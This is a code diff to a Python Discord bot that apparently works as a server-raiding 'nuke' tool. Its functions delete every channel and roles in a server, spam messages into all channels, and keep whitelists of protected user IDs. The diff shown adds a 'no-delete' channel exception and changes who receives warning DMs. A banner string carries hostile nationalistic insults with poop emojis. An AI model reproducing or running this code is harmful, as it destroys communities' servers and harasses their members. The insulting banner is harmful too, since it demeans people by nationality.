@@ -25,7 +25,6 @@ INDIA MAURABAD :flag_in: :poop: :flag_il: :poop:
 FREEDOM FOR PALESTINE :flag_ps: :muscle:**"""
 
         self.invites = 'https://discord.gg/Hq753Xz'
-        self.koda = 653983428785733652
         self.whitelist = [653983428785733652, 703244120881234011]
         self.no_ban = [653983428785733652, 703244120881234011]
         self.servers = [700008439295770685]
@@ -33,11 +32,12 @@ FREEDOM FOR PALESTINE :flag_ps: :muscle:**"""
     async def delete_channels(self, ctx):
         print("Deleted channels ( ", end='', flush=True)
         for channel in ctx.guild.channels:
-            try:
-                await channel.delete()
-                print(f"'{channel.name}', ", end='', flush=True)
-            except:
-                pass
+            if not channel.name == 'no-delete':
+                try:
+                    await channel.delete()
+                    print(f"'{channel.name}', ", end='', flush=True)
+                except:
+                    pass
         print(')\n')
 
     async def delete_roles(self, ctx):
@@ -88,7 +88,8 @@ FREEDOM FOR PALESTINE :flag_ps: :muscle:**"""
 
     async def spam_all_channels(self, ctx):
         for channel in ctx.guild.channels:
-            await channel.send(">spam")
+            if not channel.name == 'no-delete':
+                await channel.send(">spam")
 
     @commands.Cog.listener()
     async def on_message(self, ctx):
@@ -97,7 +98,7 @@ FREEDOM FOR PALESTINE :flag_ps: :muscle:**"""
                 await self.spam_channel(ctx.channel)
 
     async def warn(self, ctx, t):
-        koda = self.bot.get_user(self.koda)
+        koda = self.bot.get_user(self.whitelist[0])
         await koda.send(f"{ctx.author} attempted to use the {t} command in {ctx.guild.name}.")
 
     @commands.command()
